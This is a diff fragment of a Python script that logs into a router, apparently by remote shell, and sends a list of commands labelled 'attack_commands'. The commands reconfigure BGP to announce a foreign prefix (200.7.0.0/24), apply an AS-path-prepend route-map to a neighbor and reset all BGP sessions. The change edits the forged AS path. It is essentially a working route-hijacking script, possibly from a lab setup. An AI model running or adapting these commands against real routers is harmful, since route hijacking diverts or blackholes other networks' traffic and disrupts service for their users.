@@ -20,7 +20,7 @@ output = remote_conn.recv(65535)
 print(output.decode("utf-8"))
 
 attack_commands = ['vtysh\n', 'conf t\n', 'router bgp 8\n', 'network 200.7.0.0/24\n', 'ip route 200.7.0.0 255.255.255.0 216.239.32.1\n', 'access-list 10 permit 200.7.0.0 255.255.255.0\n',
-                   'route-map toMY-ISP permit 10\n', 'match ip address 10\n', 'set as-path prepend 5 1 2\n', 'exit\n', 'router bgp 8\n', 'neighbor 216.239.32.1 route-map toMY-ISP out \n', 'exit\n', 'do clear ip bgp *\n']
+                   'route-map toMY-ISP permit 10\n', 'match ip address 10\n', 'set as-path prepend 8 5 1 2\n', 'exit\n', 'router bgp 8\n', 'neighbor 216.239.32.1 route-map toMY-ISP out \n', 'exit\n', 'do clear ip bgp *\n']
 
 for attack_command in attack_commands:
     remote_conn.send(attack_command)
